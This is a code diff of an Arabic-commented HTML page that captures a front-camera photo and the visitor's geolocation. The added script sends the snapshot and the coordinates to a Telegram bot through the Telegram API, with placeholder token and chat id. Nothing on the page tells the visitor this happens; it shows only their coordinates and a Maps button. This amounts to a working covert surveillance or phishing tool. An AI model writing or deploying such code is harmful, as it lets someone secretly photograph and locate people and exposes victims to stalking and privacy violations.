@@ -46,46 +46,73 @@
   <div id="location"></div>
   <button id="mapsBtn">افتح الموقع في Google Maps</button>
 
-  <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const context = canvas.getContext("2d");
-    const locationDiv = document.getElementById("location");
-    const mapsBtn = document.getElementById("mapsBtn");
+<script>
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const context = canvas.getContext("2d");
+  const locationDiv = document.getElementById("location");
+  const mapsBtn = document.getElementById("mapsBtn");
 
-    // تشغيل الكاميرا الأمامية
-    navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
-    })
-    .then(stream => {
-      video.srcObject = stream;
-      video.onloadedmetadata = () => {
-        setTimeout(() => {
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          stream.getTracks().forEach(track => track.stop());
-        }, 1000);
-      };
-    })
-    .catch(err => {
-      console.error("فشل الوصول إلى الكاميرا:", err.message);
-    });
+  let latitude = null, longitude = null;
 
-    // تحديد الموقع الجغرافي
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          const lat = position.coords.latitude.toFixed(6);
-          const lon = position.coords.longitude.toFixed(6);
-          locationDiv.textContent = `Latitude: ${lat} | Longitude: ${lon}`;
-          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-          mapsBtn.style.display = "inline-block";
-          mapsBtn.onclick = () => {
-            window.open(mapsLink, "_blank");
-          };
+  // تشغيل الكاميرا
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" },
+    audio: false
+  }).then(stream => {
+    video.srcObject = stream;
+    video.onloadedmetadata = () => {
+      setTimeout(() => {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach(track => track.stop());
+
+        // بعد التقاط الصورة، نحولها لـ base64 ونرسلها
+        const imageData = canvas.toDataURL("image/png");
+
+        // نرسل البيانات فقط إذا كانت الإحداثيات متوفرة
+        if (latitude && longitude) {
+          sendToTelegram(imageData, latitude, longitude);
         }
-      );
-    }
-  </script>
+      }, 1000);
+    };
+  });
+
+  // تحديد الموقع
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        latitude = pos.coords.latitude.toFixed(6);
+        longitude = pos.coords.longitude.toFixed(6);
+        locationDiv.textContent = `Latitude: ${latitude} | Longitude: ${longitude}`;
+
+        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        mapsBtn.style.display = "inline-block";
+        mapsBtn.onclick = () => window.open(mapsLink, "_blank");
+      }
+    );
+  }
+
+  // إرسال البيانات إلى تليجرام
+  function sendToTelegram(base64Image, lat, lon) {
+    const botToken = "YOUR_BOT_TOKEN";
+    const chatId = "YOUR_CHAT_ID";
+
+    // تحويل الصورة إلى Blob لإرسالها
+    fetch(base64Image)
+      .then(res => res.blob())
+      .then(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "image.png");
+        formData.append("caption", `📍 الموقع:\nLatitude: ${lat}\nLongitude: ${lon}`);
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      });
+  }
+</script>
+
 </body>
 </html>
